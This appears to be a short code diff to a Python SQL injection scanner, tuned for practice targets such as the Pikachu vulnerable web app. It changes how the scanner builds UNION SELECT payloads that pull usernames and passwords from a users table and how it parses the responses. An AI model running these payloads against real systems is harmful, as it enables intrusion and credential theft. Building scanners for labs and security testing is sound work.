@@ -559,6 +559,7 @@ class SQLInjectionScanner:
             for change in changes['added']:
                 change = change.replace(payload_twos, "")
                 change = change.replace("用户名中含有的结果如下：", "") # 土法
+                change = change.replace("ID:", "") # 土法
                 for i in range(1, column_count + 1):
                     if "2" in change:
                         # 替换"2"为捕获组，创建正则表达式模式
@@ -1098,8 +1099,20 @@ class SQLInjectionScanner:
         dict = {
             1:"username",
             2:"username,password",
-            3:"1,username,password",
+            3:"username,password,1",
         }
+        if "pikachu" in self.base_url:
+            dict = {
+                1:"username",
+                2:"username,password",
+                3:"username,password,1",
+            }
+        else:
+            dict = {
+                1:"user",
+                2:"user,password",
+                3:"user,password,1",
+            }
         test_payload = f"{payload} union select {dict[column_count]} from users # " if method == 'GET' else f"{payload} union select {dict[column_count]} from users"
         # if closing_pattern == "string":
         #     if column_count >= 2:
